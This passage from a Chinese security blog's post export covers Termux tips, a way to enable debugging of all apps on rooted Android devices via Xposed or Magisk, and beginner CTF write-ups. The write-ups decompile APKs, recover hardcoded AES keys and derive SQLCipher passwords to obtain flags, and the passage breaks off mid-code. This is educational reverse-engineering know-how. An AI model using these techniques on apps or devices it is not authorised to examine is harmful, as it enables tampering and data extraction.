\"02:00:00:00:00:00\", \"network_id\": 0, \"rssi\": -53, \"ssid\": \"&lt;unknown ssid&gt;\", \"ssid_hidden\": true, \"supplicant_state\": \"COMPLETED\"&#125; 获取最近一次 Wi-Fi 扫描信息： 1$ termux-wifi-scaninfo nyancat彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载： 1apt install nyancat 终端二维码生成终端二维码（字体没选好，效果不太好）： 1echo \"https://qianfei11.github.io\" | curl -F-=\\&lt;- qrenco.de Referenceshttps://mushuichuan.com/2017/12/10/termux/http://blackwolfsec.cc/2016/12/10/termux/https://www.sqlsec.com/2018/05/termux.html","categories":[],"tags":[{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"不同版本Android动态调试前打开调试开关简述","slug":"不同版本Android动态调试前打开调试开关简述","date":"2020-02-29T02:13:37.000Z","updated":"2020-03-01T03:15:16.903Z","comments":true,"path":"2020/02/29/不同版本Android动态调试前打开调试开关简述/","link":"","permalink":"blog.b3ale.cn/2020/02/29/不同版本Android动态调试前打开调试开关简述/","excerpt":"手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。","text":"手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。 Intro众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 android:debuggable=&quot;true&quot; 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。 网上还有另外一种修改 Android prop 的工具 mprop，用来修改 default.prop 中的 ro.debuggable 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。 最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。 Android 4设备：Nexus 5 开启动态调试的要求是已 root，并且安装了 Xposed 框架。 BDOpenerBDOpener 下载链接 这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。 Android 9设备：Pixel XL 开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。 MagiskHidePropsConfMagiskHidePropsConf 下载链接 Busybox 下载链接 MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 ro.debuggable 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting... 重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。 Referenceshttps://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/https://bbs.pediy.com/thread-248322.htm","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"android","slug":"android","permalink":"blog.b3ale.cn/tags/android/"}]},{"title":"攻防世界-MOBILE-新手练习区","slug":"[TODO]攻防世界-MOBILE-新手练习区","date":"2020-02-20T11:51:47.000Z","updated":"2020-03-15T09:07:03.243Z","comments":true,"path":"2020/02/20/[TODO]攻防世界-MOBILE-新手练习区/","link":"","permalink":"blog.b3ale.cn/2020/02/20/[TODO]攻防世界-MOBILE-新手练习区/","excerpt":"持续更新。","text":"持续更新。 app1将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; Button btn; public final String pName = BuildConfig.APPLICATION_ID; EditText text; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); this.btn = (Button) findViewById(R.id.checBtn); this.text = (EditText) findViewById(R.id.input); this.btn.setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; try &#123; String inputString = MainActivity.this.text.getText().toString(); PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY); String versionCode = pinfo.versionName; // 获取包信息中的versionName int versionName = pinfo.versionCode; // 获取包信息中的versionCode int i = 0; while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) &#123; if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) &#123; // 将versionCode中的每一字节和versionName异或并和输入比较 Toast.makeText(MainActivity.this, \"\\u518d\\u63a5\\u518d\\u5389\\uff0c\\u52a0\\u6cb9~\", 1).show(); // 再接再厉，加油~ return; &#125; i++; &#125; if (inputString.length() == versionCode.length()) &#123; // 判断输入的长度和versionCode是否相同 Toast.makeText(MainActivity.this, \"\\u606d\\u559c\\u5f00\\u542f\\u95ef\\u5173\\u4e4b\\u95e8\\uff01\", 1).show(); // 恭喜开启闯关之门！ return; &#125; &#125; catch (NameNotFoundException e) &#123; &#125; Toast.makeText(MainActivity.this, \"\\u5e74\\u8f7b\\u4eba\\u4e0d\\u8981\\u800d\\u5c0f\\u806a\\u660e\\u5662\", 1).show(); // 年轻人不要耍小聪明噢 &#125; &#125;); &#125;&#125; 代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" android:versionCode=\"15\" android:versionName=\"X&lt;cP[?PHNB&lt;P?aj\" package=\"com.example.yaphetshan.tencentgreat\" platformBuildVersionCode=\"25\" platformBuildVersionName=\"7.1.1\"&gt; &lt;uses-sdk android:minSdkVersion=\"19\" android:targetSdkVersion=\"25\" /&gt; &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt; &lt;meta-data android:name=\"android.support.VERSION\" android:value=\"25.3.0\" /&gt; &lt;application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@mipmap/ic_launcher\" android:debuggable=\"true\" android:allowBackup=\"true\" android:supportsRtl=\"true\" android:roundIcon=\"@mipmap/ic_launcher_round\"&gt; &lt;activity android:name=\"com.example.yaphetshan.tencentgreat.MainActivity\"&gt; &lt;intent-filter&gt; &lt;action android:name=\"android.intent.action.MAIN\" /&gt; &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; &lt;/application&gt;&lt;/manifest&gt; 编写脚本来得到 flag： 12345678#!/usr/bin/env pythonversionCode = 15versionName = \"X&lt;cP[?PHNB&lt;P?aj\"flag = ''for c in versionName: flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne app2先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint(&#123;\"ShowToast\"&#125;)public class MainActivity extends Activity implements OnClickListener &#123; private Button a; private Handler b = null; private EditText c; private EditText d; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.activity_main); this.a = (Button) findViewById(R.id.button1); this.a.setOnClickListener(this); this.c = (EditText) findViewById(R.id.editText1); this.d = (EditText) findViewById(R.id.editText2); Editor edit = getSharedPreferences(\"test\", 0).edit(); edit.putLong(\"ili\", System.currentTimeMillis()); edit.commit(); Log.d(\"hashcode\", SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem menuItem) &#123; if (menuItem.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(menuItem); &#125; public void onClick(View view) &#123; switch (view.getId()) &#123; case R.id.button1: if (this.c.getText().length() == 0 || this.d.getText().length() == 0) &#123; Toast.makeText(this, \"\\u4e0d\\u80fd\\u4e3a\\u7a7a\", 1).show(); // 不能为空 return; &#125; String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串 String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串 Log.e(\"test\", obj + \" test2 = \" + obj2); Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity intent.putExtra(\"ili\", obj); // 设置变量ili的值为obj的值 intent.putExtra(\"lil\", obj2); // 设置变量lil的值为obj2的值 startActivity(intent); // 调用SecondActivity return; default: return; &#125; &#125;&#125; 接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a &#123; private BroadcastReceiver c = new BroadcastReceiver(this) &#123; final /* synthetic */ SecondActivity a; &#123; this.a = r1; &#125; public void onReceive(Context context, Intent intent) &#123; Toast.makeText(context, \"myReceiver receive\", 0).show(); if (!context.getPackageName().equals(intent.getAction())) &#123; &#125; &#125; &#125;; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.activity_main2); Intent intent = getIntent(); String stringExtra = intent.getStringExtra(\"ili\"); // obj String stringExtra2 = intent.getStringExtra(\"lil\"); // obj2 if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(\"VEIzd/V2UPYNdn/bxH3Xig==\")) &#123; // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串 intent.setAction(\"android.test.action.MoniterInstallService\"); intent.setClass(this, MoniterInstallService.class); intent.putExtra(\"company\", \"tencent\"); intent.putExtra(\"name\", \"hacker\"); intent.putExtra(\"age\", 18); startActivity(intent); startService(intent); &#125; Editor edit = getSharedPreferences(\"test\", 0).edit(); edit.putString(\"ilil\", stringExtra); edit.putString(\"lili\", stringExtra2); edit.commit(); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.main, menu); return true; &#125; public boolean onOptionsItemSelected(MenuItem menuItem) &#123; if (menuItem.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(menuItem); &#125;&#125; 然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的： 1234567891011121314151617package com.tencent.testvuln.c;public class Encryto &#123; public static native int checkSignature(Object obj); public static native String decode(Object obj, String str); public static native String doRawData(Object obj, String str); public static native String encode(Object obj, String str); public native String HelloLoad(); static &#123; System.loadLibrary(\"JNIEncrypt\"); &#125;&#125; 用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数： 123456789101112131415.data:00006008 off_6008 DCD aChecksignature_0 ; DATA XREF: register_ndk_load+22↑o.data:00006008 ; .text:off_221C↑o.data:00006008 ; &quot;checkSignature&quot;.data:0000600C DCD aLjavaLangObjec ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010 DCD check+1.data:00006014 DCD aDecode_0 ; &quot;decode&quot;.data:00006018 DCD aLjavaLangObjec_0 ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C DCD decode+1.data:00006020 DCD aEncode_0 ; &quot;encode&quot;.data:00006024 DCD aLjavaLangObjec_0 ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028 DCD encode+1.data:0000602C DCD aDorawdata_0 ; &quot;doRawData&quot;.data:00006030 DCD aLjavaLangObjec_0 ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034 DCD doRawData+1.data:00006034 ; .data ends 看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5： 1234567891011121314151617181920212223242526272829303132333435363738int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string)&#123; _JNIEnv *v4; // r4 char *v5; // r9 const char *utf_string; // r6 int ciphertext; // r8 int result; // r0 jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6 char *v10; // r5 size_t v11; // r2 int key; // [sp+0h] [bp-28h] int v13; // [sp+18h] [bp-10h] v4 = env; v5 = string; if ( j_checkSignature((int)env, a2, a3) == 1 &amp;&amp; (strcpy((char *)&amp;key, \"thisisatestkey==\"), utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)( v4, v5, 0), ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key), ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string), result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext), _stack_chk_guard == v13) ) &#123; return result; &#125; do &#123; v9 = v4-&gt;functions-&gt;NewString; v10 = UNSIGNATURE[0]; v11 = strlen(UNSIGNATURE[0]); &#125; while ( _stack_chk_guard != v13 ); result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11); return result;&#125; 然后进去看到加密完成之后进行了 base64 加密在返回密文： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2)&#123; int v2; // r9 const char *v3; // r10 signed int v4; // r0 signed int v5; // r5 _BYTE *v6; // r11 signed int v7; // r0 const char *v8; // r1 signed int v9; // r8 char *v10; // r10 int v11; // r5 _BYTE *v12; // r0 signed int v13; // r2 char v14; // r6 int v15; // r6 int v16; // r4 int v17; // r5 v2 = a2; v3 = a1; v4 = strlen(a1); v5 = v4; if ( v4 &lt;= 15 ) &#123; v6 = malloc(0x10u); v7 = 0; do &#123; v8 = &amp;byte_3BB0[16 - v5]; if ( v7 &lt; v5 ) v8 = &amp;v3[v7]; v6[v7++] = *v8; &#125; while ( v7 != 16 ); v9 = 16; v10 = (char *)malloc(0x10u); v11 = 1;LABEL_18: v15 = 0; v16 = 0; do &#123; j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]); ++v16; v15 += 16; &#125; while ( v16 &lt; v11 ); goto LABEL_22; &#125; v9 = (v4 + 16) &amp; 0xFFFFFFF0; v12 = malloc(v9); v6 = v12; if ( v9 &lt;= 0 ) &#123; v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0); goto LABEL_22; &#125; v13 = 0; do &#123; if ( v13 &gt;= v5 ) &#123; if ( !(v5 &amp; 0xF) ) &#123; v12[v13] = 16; goto LABEL_15; &#125; v14 = byte_3BB0[v9 - v5]; &#125; else &#123; v14 = v3[v13]; &#125; v12[v13] = v14;LABEL_15: ++v13; &#125; while ( v9 != v13 ); v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0); if ( v9 &gt;= 16 ) &#123; v11 = v9 / 16; goto LABEL_18; &#125;LABEL_22: v17 = j_b64_encode((int)v10, v9); free(v6); free(v10); return v17;&#125; 用 Python 脚本解密得到明文： 123456789#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = 'thisisatestkey=='aes = AES.new(key, AES.MODE_ECB)ciphertext = 'VEIzd/V2UPYNdn/bxH3Xig=='.decode('base64')print aes.decrypt(ciphertext)# aimagetencent 尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样： 12345678910111213141516package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a &#123; private TextView c; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.activity_main3); this.c = (TextView) findViewById(R.id.textView1); this.c.setText(Encryto.decode(this, \"9YuQ2dk8CSaCe7DTAmaqAA==\")); &#125;&#125; 最后用这里的密文解密得到了 flag： 1234...ciphertext2 = '9YuQ2dk8CSaCe7DTAmaqAA=='.decode('base64')print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3 app3拿到文件用 file 没有识别出来，xxd 看一下： 1234567891011$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32 ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797 ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328 .\"=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202 *e....F#.\"H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf .&#125;..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0 ...u&#125;.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37 .R.P...E)x.....7 搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压： 123$ java -jar abe.jar unpack app3.ab app3.tar \"\"0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar. 在解压得到的 tar 包： 12345$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest 生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 a() 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener &#123; private SQLiteDatabase a; private a b; private Button c; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); this.c = (Button) findViewById(R.id.add_data); this.c.setOnClickListener(this); Editor edit = getSharedPreferences(\"test\", 0).edit(); edit.putString(\"Is_Encroty\", \"1\"); // Is_Encroty=\"1\" edit.putString(\"Encryto\", \"SqlCipher\"); // Encryto=\"SqlCipher\" edit.putString(\"ver_sion\", \"3_4_0\"); // ver_sion=\"3_4_0\" edit.apply(); a(); &#125; private void a() &#123; SQLiteDatabase.loadLibs(this); this.b = new a(this, \"Demo.db\", null, 1); // 打开Demo.db ContentValues contentValues = new ContentValues(); contentValues.put(\"name\", \"Stranger\"); // name=\"Stanger\" contentValues.put(\"password\", Integer.valueOf(123456)); // password=123456 a aVar = new a(); String a = aVar.a(contentValues.getAsString(\"name\"), contentValues.getAsString(\"password\")); // a = name[:4] + password[:4] this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(\"password\"))).substring(0, 7)); // 将SHA1(a+MD5(a)+\"yaphetshan\")[:7]作为密码，获取指定数据库接口 this.a.insert(\"TencentMicrMsg\", null, contentValues); // 将数据contentValues插入表TencentMicrMsg &#125; public void onClick(View view) &#123; if (view == this.c) &#123; Intent intent = new Intent(); intent.putExtra(\"name\", \"name\"); intent.putExtra(\"password\", \"pass\"); intent.setClass(this, AnotherActivity.class); startActivity(intent); &#125; &#125;&#125; 在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag： 12345678910111213141516171819202122package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper &#123; private int a = 0; public a(Context context, String str, CursorFactory cursorFactory, int i) &#123; // 打开指定数据库 super(context, str, cursorFactory, i); &#125; public void onCreate(SQLiteDatabase sQLiteDatabase) &#123; sQLiteDatabase.execSQL(\"create table TencentMicrMsg(name text,password integer,F_l_a_g text)\"); // 表TencentMicrMsg中三个字段分别是text、integer和text &#125; public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) &#123; &#125;&#125; 在包 a 下的 a 类，其中两个函数可以根据 b 类的函数分析得到功能： 123456789101112131415161718192021package com.example.yaphetshan.tencentwelcome.a;/* compiled from: Cipher */public class a &#123; private String a = \"yaphetshan\"; public String a(String str, String str2) &#123; String substring = str.substring(0, 4); return substring + str2.substring(0, 4); &#125; public String b(String str, String str2) &#123; // 返回MD5十六进制字符串 b bVar = new b(); return b.a(str); &#125; public String a(String str) &#123; // 返回SHA1(str+\"yaphetshan\")的十六进制字符串 b bVar = new b(); return b.b(str + this.a); &#125;&#125; 包 a 下的 b 类，根据 MessageDigest 创建的实例可以分别判断出是获取 MD5 和 SHA-1 的十六进制摘要： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.example.yaphetshan.tencentwelcome.a;import java.security.MessageDigest;/* compiled from: SHA1Manager */public class b &#123; public static final String a(String str) &#123; // 获取MD5十六进制字符串 int i = 0; char[] cArr = new char[]&#123;'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'&#125;; try &#123; byte[] bytes = str.getBytes(); MessageDigest instance = MessageDigest.getInstance(\"MD5\"); instance.update(bytes); byte[] digest = instance.digest(); // 获取MD5哈希摘要 int length = digest.length; char[] cArr2 = new char[(length * 2)]; int i2 = 0; while (i &lt; length) &#123; byte b = digest[i]; int i3 = i2 + 1; cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15]; i2 = i3 + 1; cArr2[i3] = cArr[b &amp; 15]; i++; &#125; return new String(cArr2); &#125; catch (Exception e) &#123; return null; &#125; &#125; public static final String b(String str) &#123; // 获取SHA1十六进制字符串 int i = 0; char[] cArr = new char[]&#123;'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'&#125;; try &#123; byte[] bytes = str.getBytes(); MessageDigest instance = MessageDigest.getInstance(\"SHA-1\"); instance.update(bytes); byte[] digest = instance.digest(); // 获取SHA1哈希摘要 int length = digest.length; char[] cArr2 = new char[(length * 2)]; int i2 = 0; while (i &lt; length) &#123; byte b = digest[i]; int i3 = i2 + 1; cArr2[i2] = cArr[(b &gt;&gt;&gt; 4) &amp; 15]; i2 = i3 + 1; cArr2[i3] = cArr[b &amp; 15]; i++; &#125; return new String(cArr2); &#125; catch (Exception e) &#123; return null; &#125; &#125;&#125; 那么根据上面的分析可以正向地得到密码： 123456789101112#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()sha1hash = lambda m: hashlib.sha1(m).hexdigest()name = \"Stranger\"password = \"123456\"a = name[:4] + password[:4]database = sha1hash(a + md5hash(a) + \"yaphetshan\")[:7]print database# ae56f99 打开 Decypt.db 库，查看表中数据： 将字段中的字符串解 base64： 12$ echo \"VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=\" | base64 -DTctf&#123;H3ll0_Do_Y0u_Lov3_Tenc3nt!&#125; easy-apk把 apk 拖进 jadx，反编译查看入口事件代码，判断出对输入进行了 Base64 加密： 12345678910111213141516171819202122232425package com.testjava.jack.pingan1;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() &#123; public void onClick(View view) &#123; if (new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(\"5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=\")) &#123; Toast.makeText(MainActivity.this, \"\\u9a8c\\u8bc1\\u901a\\u8fc7!\", 1).show(); // 验证通过! &#125; else &#123; Toast.makeText(MainActivity.this, \"\\u9a8c\\u8bc1\\u5931\\u8d25!\", 1).show(); // 验证失败! &#125; &#125; &#125;); &#125;&#125; 再看看 Base64New 类中代码，发现是一个换表的 base64： 123456789101112131415161718192021222324252627282930313233343536package com.testjava.jack.pingan1;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;public class Base64New &#123; private static final char[] Base64ByteToStr = new char[]&#123;'v', 'w', 'x', 'r', 's', 't', 'u', 'o', 'p', 'q', '3', '4', '5', '6', '7', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'y', 'z', '0', '1', '2', 'P', 'Q', 'R', 'S', 'T', 'K', 'L', 'M', 'N', 'O', 'Z', 'a', 'b', 'c', 'd', 'U', 'V', 'W', 'X', 'Y', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', '8', '9', '+', '/'&#125;; private static final int RANGE = 255; private static byte[] StrToBase64Byte = new byte[AccessibilityNodeInfoCompat.ACTION_CLEAR_ACCESSIBILITY_FOCUS]; public String Base64Encode(byte[] bytes) &#123; StringBuilder res = new StringBuilder(); for (int i = 0; i &lt;= bytes.length - 1; i += 3) &#123; int k; byte[] enBytes = new byte[4]; byte tmp = (byte) 0; for (k = 0; k &lt;= 2; k++) &#123; if (i + k &lt;= bytes.length - 1) &#123; enBytes[k] = (byte) (((bytes[i + k] &amp; RANGE) &gt;&gt;&gt; ((k * 2) + 2)) | tmp); tmp = (byte) ((((bytes[i + k] &amp; RANGE) &lt;&lt; (((2 - k) * 2) + 2)) &amp; RANGE) &gt;&gt;&gt; 2); &#125; else &#123; enBytes[k] = tmp; tmp = (byte) 64; &#125; &#125; enBytes[3] = tmp; for 